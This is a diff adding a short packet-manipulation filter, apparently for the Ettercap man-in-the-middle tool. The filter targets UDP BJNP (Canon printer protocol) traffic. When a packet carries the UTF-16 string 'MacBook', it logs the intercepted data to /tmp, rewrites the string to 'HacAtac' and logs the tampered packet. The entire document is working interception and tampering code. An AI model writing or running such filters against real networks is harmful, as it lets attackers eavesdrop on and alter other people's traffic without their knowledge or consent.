@@ -1,0 +1,17 @@
+if (ip.proto == UDP) {
+	if (search(DECODED.data, "BJNP")) {
+		msg("BJNP (udp) packet found!");
+		# Look's for "Mac" in header
+		if (search(DATA.data, "\x4d\x00\x61\x00\x63\x00\x42\x00\x6f\x00\x6f\x00\x6b")) {
+			msg("User is printing from a Mac!\n");
+
+			log(DATA.data, "/tmp/BJNP_Header.log");
+
+			replace("\x4d\x00\x61\x00\x63\x00\x42\x00\x6f\x00\x6f\x00\x6b", "\x48\x00\x61\x00\x63\x00\x41\x00\x74\x00\x61\x00\x63");
+
+			msg("Packet BJNP header has been modified!");
+
+			log(DATA.data, "/tmp/BJNP_Header_Change.log");
+		}
+	}
+}
